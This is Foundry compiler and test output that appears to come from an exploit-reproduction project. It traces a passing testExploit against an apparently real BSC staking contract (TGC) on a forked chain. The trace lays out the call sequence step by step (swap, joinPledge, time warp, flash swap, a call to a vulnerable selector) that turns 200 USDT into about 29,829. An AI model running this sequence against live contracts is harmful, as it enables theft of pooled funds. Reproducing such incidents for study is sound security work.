Compiling 23 files with Solc 0.8.28
Solc 0.8.28 finished in 1.22s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1084:5:
     |
1084 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1896:5:
     |
1896 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2198:5:
     |
2198 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2967:5:
     |
2967 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:4424:5:
     |
4424 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-05/TGC_exp.sol:12:5:
   |
12 |     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2436:1:
     |
2436 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-05/TGC_exp.sol:16:5:
   |
16 |     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:1878:1:
     |
1878 | interface USDT {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2024-05/TGC_exp.sol:37:9:
   |
37 |         address(vulnContract).call(abi.encodeWithSelector(bytes4(0x836aefb0), 100_000_000_000_000_000_000));
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (9302): Return value of low-level calls not used.
  --> src/test/2024-05/TGC_exp.sol:45:9:
   |
45 |         address(vulnContract).call(abi.encodeWithSelector(bytes4(0xfd5a466f)));
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/test/2024-05/TGC_exp.sol:44:26:
   |
44 |     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
   |                          ^^^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/test/2024-05/TGC_exp.sol:44:42:
   |
44 |     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
   |                                          ^^^^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/test/2024-05/TGC_exp.sol:44:59:
   |
44 |     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
   |                                                           ^^^^^^^^^^^^^^^

Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/test/2024-05/TGC_exp.sol:44:76:
   |
44 |     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
   |                                                                            ^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 533.29ms (2.54ms CPU time)

Ran 1 test for src/test/2024-05/TGC_exp.sol:ContractTest
[PASS] testExploit() (gas: 354140)
Logs:
  [Begin] Attacker USDT before exploit: 200.000000000000000000
  [End] Attacker USDT after exploit: 29829.119514728633925548

Traces:
  [272404] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("bsc", 38623654 [3.862e7])
    │   └─ ← [Return] 0
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26542161622221038197 [2.654e19]
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26542161622221038197 [2.654e19]
    ├─ [0] VM::accesses(0x55d398326f99059fF775485246999027B3197955)
    │   └─ ← [Return] [0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96], []
    ├─ [0] VM::load(0x55d398326f99059fF775485246999027B3197955, 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000017058b35e777da275
    ├─ [0] VM::load(0x55d398326f99059fF775485246999027B3197955, 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000017058b35e777da275
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26542161622221038197 [2.654e19]
    ├─ [0] VM::store(0x55d398326f99059fF775485246999027B3197955, 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x55d398326f99059fF775485246999027B3197955, 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x0000000000000000000000000000000000000000000000017058b35e777da275)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x55d398326f99059fF775485246999027B3197955, fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 81201235000773904770131445719184449197250777359516868712991521815545917127830 [8.12e76])
    ├─ [0] VM::load(0x55d398326f99059fF775485246999027B3197955, 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000017058b35e777da275
    ├─ [0] VM::store(0x55d398326f99059fF775485246999027B3197955, 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x00000000000000000000000000000000000000000000000ad78ebc5ac6200000)
    │   └─ ← [Return]
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 200000000000000000000 [2e20]
    └─ ← [Stop]

  [447940] ContractTest::testExploit()
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 200000000000000000000 [2e20]
    ├─ emit log_named_decimal_uint(key: "[Begin] Attacker USDT before exploit", val: 200000000000000000000 [2e20], decimals: 18)
    ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 100000000000000000000 [1e20])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 100000000000000000000 [1e20])
    │   ├─  storage changes:
    │   │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
    │   └─ ← [Return] true
    ├─ [101422] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(100000000000000000000 [1e20], 0, [0x55d398326f99059fF775485246999027B3197955, 0x523aA213FE806778Ffa597b6409382fFfcc12De2], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1715415330 [1.715e9])
    │   ├─ [13634] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xBb33668bAe76A6394683DeEf645487e333b8fC45, 100000000000000000000 [1e20])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBb33668bAe76A6394683DeEf645487e333b8fC45, value: 100000000000000000000 [1e20])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 0)
    │   │   ├─  storage changes:
    │   │   │   @ 0xeb175cd2ae5c9b33c5673958c7389d9b7c1e82f9332f251e5ca03ad51c438c7d: 0x00000000000000000000000000000000000000000000064a8ad4765eadd21df8 → 0x00000000000000000000000000000000000000000000064ff69bd48c10e21df8
    │   │   │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000000000000000000000000000000000000000000000ad78ebc5ac6200000 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
    │   │   └─ ← [Return] true
    │   ├─ [2560] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2893] 0xBb33668bAe76A6394683DeEf645487e333b8fC45::getReserves() [staticcall]
    │   │   └─ ← [Return] 29641832603827426300890 [2.964e22], 29709261709493690047992 [2.97e22], 1715410720 [1.715e9]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   └─ ← [Return] 29809261709493690047992 [2.98e22]
    │   ├─ [69052] 0xBb33668bAe76A6394683DeEf645487e333b8fC45::swap(99190567974788015715 [9.919e19], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [34649] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99190567974788015715 [9.919e19])
    │   │   │   ├─ emit Transfer(from: 0xBb33668bAe76A6394683DeEf645487e333b8fC45, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 99190567974788015715 [9.919e19])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x000000000000000000000000000000000000000000000005608bb009f67a2663
    │   │   │   │   @ 0xeb175cd2ae5c9b33c5673958c7389d9b7c1e82f9332f251e5ca03ad51c438c7d: 0x000000000000000000000000000000000000000000000646e310280565e413da → 0x000000000000000000000000000000000000000000000641828477fb6f69ed77
    │   │   │   └─ ← [Return] true
    │   │   ├─ [560] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   │   └─ ← [Return] 29542642035852638285175 [2.954e22]
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   │   └─ ← [Return] 29809261709493690047992 [2.98e22]
    │   │   ├─ emit Sync(reserve0: 29542642035852638285175 [2.954e22], reserve1: 29809261709493690047992 [2.98e22])
    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 100000000000000000000 [1e20], amount0Out: 99190567974788015715 [9.919e19], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─  storage changes:
    │   │   │   @ 10: 0x00000000000000000000000000000001f0c763ddbf8c9b013f4ea87be59dd08f → 0x0000000000000000000000000000000202beed56337e0e629b353e264188f1eb
    │   │   │   @ 9: 0x00000000000000000000000000000001fbea68e3ed1e8f0e7ac9c52116714f8e → 0x000000000000000000000000000000020df6e5834f0381ee47034fd07f9fce16
    │   │   │   @ 8: 0x663f172000000000064a8ad4765eadd21df8000000000646e310280565e413da → 0x663f292200000000064ff69bd48c10e21df8000000000641828477fb6f69ed77
    │   │   └─ ← [Stop]
    │   ├─ [560] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 99190567974788015715 [9.919e19]
    │   └─ ← [Stop]
    ├─ [24651] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::approve(0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─  storage changes:
    │   │   @ 0x4f865b326ab64d28b6f68c91cb64f2c44343859d9a28422fadeac14ffdebd5d4: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   └─ ← [Return] true
    ├─ [120948] 0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df::joinPledge(100000000000000000000 [1e20])
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   └─ ← [Return] 29809261709493690047992 [2.98e22]
    │   ├─ [560] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   └─ ← [Return] 29542642035852638285175 [2.954e22]
    │   ├─ [804] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::allowance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df) [staticcall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   ├─ [11209] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df, 39642232436026903137 [3.964e19])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df, value: 39642232436026903137 [3.964e19])
    │   │   ├─  storage changes:
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000000005608bb009f67a2663 → 0x0000000000000000000000000000000000000000000000033a662fac01a01c02
    │   │   │   @ 0xdc8bbe3846ee66ea8d00f00688fb0156088638a73775170e29f691abffa3f685: 0x00000000000000000000000000000000000000000052c1a55aa65e700bb4ce16 → 0x00000000000000000000000000000000000000000052c1a780cbdece008ed877
    │   │   └─ ← [Return] true
    │   ├─ [11209] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xc31Cc21095597E43E97a08D5Eaf904E800DAdacD, 9910558109006725784 [9.91e18])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xc31Cc21095597E43E97a08D5Eaf904E800DAdacD, value: 9910558109006725784 [9.91e18])
    │   │   ├─  storage changes:
    │   │   │   @ 0x8c9a03112b9fdba799980a1756485209bcab6a980e94cef835127c50908ec31e: 0x00000000000000000000000000000000000000000000027b5d64048431c5c3ce → 0x00000000000000000000000000000000000000000000027be6ed649baefc4666
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000000033a662fac01a01c02 → 0x000000000000000000000000000000000000000000000002b0dccf948469996a
    │   │   └─ ← [Return] true
    │   ├─ [11209] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000000000000000dEaD, 49552790545033628921 [4.955e19])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 49552790545033628921 [4.955e19])
    │   │   ├─  storage changes:
    │   │   │   @ 0xb34209a263f6c38fe55f099e9e70f9d67e93982480ff3234a5e0108028ad164d: 0x000000000000000000000000000000000000000000000c7977ce93d11f467143 → 0x000000000000000000000000000000000000000000000c7c277d74469156fe3c
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000000002b0dccf948469996a → 0x000000000000000000000000000000000000000000000000012def1f12590c71
    │   │   └─ ← [Return] true
    │   ├─  emit topic 0: 0xae5a675575ec2c1d671ab151ac266b9fe5f88cd9010945bd18cfd6551a917eee
    │   │           data: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000055f5dc0eae42119f200000000000000000000000000000000000000000000000000000000663f2922
    │   ├─  storage changes:
    │   │   @ 0xdc8bbe3846ee66ea8d00f00688fb0156088638a73775170e29f691abffa3f685: 0x00000000000000000000000000000000000000000052c1a55aa65e700bb4ce16 → 0x00000000000000000000000000000000000000000052c1a780cbdece008ed877
    │   │   @ 0x5f21d542f0332bb92b33ba73723f2cea8c276868d9605c67d4d389183322fec1: 0 → 1
    │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124440: 0 → 0x00000000000000000000000000000000000000000000000000000000663f2922
    │   │   @ 0x8c9a03112b9fdba799980a1756485209bcab6a980e94cef835127c50908ec31e: 0x00000000000000000000000000000000000000000000027b5d64048431c5c3ce → 0x00000000000000000000000000000000000000000000027be6ed649baefc4666
    │   │   @ 0xf9ce09b108db692395053dd01a39433c7f523275c08f1ea50eeae7dbb44c41d3: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [0] VM::warp(1715433330 [1.715e9])
    │   └─ ← [Return]
    ├─ [65469] 0xBb33668bAe76A6394683DeEf645487e333b8fC45::swap(0, 29809000000000000000000 [2.98e22], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29809000000000000000000 [2.98e22])
    │   │   ├─ emit Transfer(from: 0xBb33668bAe76A6394683DeEf645487e333b8fC45, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 29809000000000000000000 [2.98e22])
    │   │   ├─  storage changes:
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0x0000000000000000000000000000000000000000000006555ec16b5396340000
    │   │   │   @ 0xeb175cd2ae5c9b33c5673958c7389d9b7c1e82f9332f251e5ca03ad51c438c7d: 0x00000000000000000000000000000000000000000000064ff69bd48c10e21df8 → 0x00000000000000000000000000000000000000000000000003a1c765ddbe1df8
    │   │   └─ ← [Return] true
    │   ├─ [45627] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 29809000000000000000000 [2.98e22], 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   │   ├─ [17764] 0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df::fd5a466f()
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   │   │   └─ ← [Return] 261709493690047992 [2.617e17]
    │   │   │   ├─ [560] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   │   │   └─ ← [Return] 29542642035852638285175 [2.954e22]
    │   │   │   ├─ [3949] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11356064111020023926514474 [1.135e25])
    │   │   │   │   ├─ emit Transfer(from: 0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 11356064111020023926514474 [1.135e25])
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000000000012def1f12590c71 → 0x0000000000000000000000000000000000000000000964bd793e7d880df16f9b
    │   │   │   │   │   @ 0xdc8bbe3846ee66ea8d00f00688fb0156088638a73775170e29f691abffa3f685: 0x00000000000000000000000000000000000000000052c1a780cbdece008ed877 → 0x000000000000000000000000000000000000000000495cea08bb506504f6754d
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─  emit topic 0: 0x213164b3cbc3b44267b44314ff639c0f5aa1a4648e0f62220c646c843c94a92b
    │   │   │   │           data: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000005741afeff944c00000000000000000000000000000000000000000000000964bd78108e68fb98632a00000000000000000000000000000000000000000000000000000000663f6f72
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xf9ce09b108db692395053dd01a39433c7f523275c08f1ea50eeae7dbb44c41d3: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0
    │   │   │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124440: 0x00000000000000000000000000000000000000000000000000000000663f2922 → 0
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0xBb33668bAe76A6394683DeEf645487e333b8fC45, 29809000000000000000000 [2.98e22])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBb33668bAe76A6394683DeEf645487e333b8fC45, value: 29809000000000000000000 [2.98e22])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000006555ec16b5396340000 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
    │   │   │   │   @ 0xeb175cd2ae5c9b33c5673958c7389d9b7c1e82f9332f251e5ca03ad51c438c7d: 0x00000000000000000000000000000000000000000000000003a1c765ddbe1df8 → 0x00000000000000000000000000000000000000000000064ff69bd48c10e21df8
    │   │   │   └─ ← [Return] true
    │   │   ├─ [20199] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::transfer(0xBb33668bAe76A6394683DeEf645487e333b8fC45, 80000000000000000000 [8e19])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 800000000000000000 [8e17])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7367E49979e1b3e616976729Bef602C3823BCACC, value: 1600000000000000000 [1.6e18])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBb33668bAe76A6394683DeEf645487e333b8fC45, value: 77600000000000000000 [7.76e19])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000964bd793e7d880df16f9b → 0x0000000000000000000000000000000000000000000964b923056563beb16f9b
    │   │   │   │   @ 0x76eef8b955b7075197d325b783f34cd8a18e9e66dab9f3a1a09b4e4874177f81: 0x00000000000000000000000000000000000000000000002149b4fa784cd33a06 → 0x0000000000000000000000000000000000000000000000215fe951fe25733a06
    │   │   │   │   @ 0xb34209a263f6c38fe55f099e9e70f9d67e93982480ff3234a5e0108028ad164d: 0x000000000000000000000000000000000000000000000c7c277d74469156fe3c → 0x000000000000000000000000000000000000000000000c7c3297a0097da6fe3c
    │   │   │   │   @ 0xeb175cd2ae5c9b33c5673958c7389d9b7c1e82f9332f251e5ca03ad51c438c7d: 0x000000000000000000000000000000000000000000000641828477fb6f69ed77 → 0x000000000000000000000000000000000000000000000645b76f0cd6f9b9ed77
    │   │   │   └─ ← [Return] true
    │   │   ├─  storage changes:
    │   │   │   @ 0xeb175cd2ae5c9b33c5673958c7389d9b7c1e82f9332f251e5ca03ad51c438c7d: 0x00000000000000000000000000000000000000000000000003a1c765ddbe1df8 → 0x00000000000000000000000000000000000000000000064ff69bd48c10e21df8
    │   │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124440: 0x00000000000000000000000000000000000000000000000000000000663f2922 → 0
    │   │   └─ ← [Stop]
    │   ├─ [560] 0x523aA213FE806778Ffa597b6409382fFfcc12De2::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   └─ ← [Return] 29620242035852638285175 [2.962e22]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xBb33668bAe76A6394683DeEf645487e333b8fC45) [staticcall]
    │   │   └─ ← [Return] 29809261709493690047992 [2.98e22]
    │   ├─ emit Sync(reserve0: 29620242035852638285175 [2.962e22], reserve1: 29809261709493690047992 [2.98e22])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 77600000000000000000 [7.76e19], amount1In: 29809000000000000000000 [2.98e22], amount0Out: 0, amount1Out: 29809000000000000000000 [2.98e22], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─  storage changes:
    │   │   @ 8: 0x663f292200000000064ff69bd48c10e21df8000000000641828477fb6f69ed77 → 0x663f6f7200000000064ff69bd48c10e21df8000000000645b76f0cd6f9b9ed77
    │   │   @ 10: 0x0000000000000000000000000000000202beed56337e0e629b353e264188f1eb → 0x00000000000000000000000000000002486dee836b22bd1c0cd2ca98581898fb
    │   │   @ 9: 0x000000000000000000000000000000020df6e5834f0381ee47034fd07f9fce16 → 0x0000000000000000000000000000000254e9584bdd88a63075073e815876ccb6
    │   └─ ← [Stop]
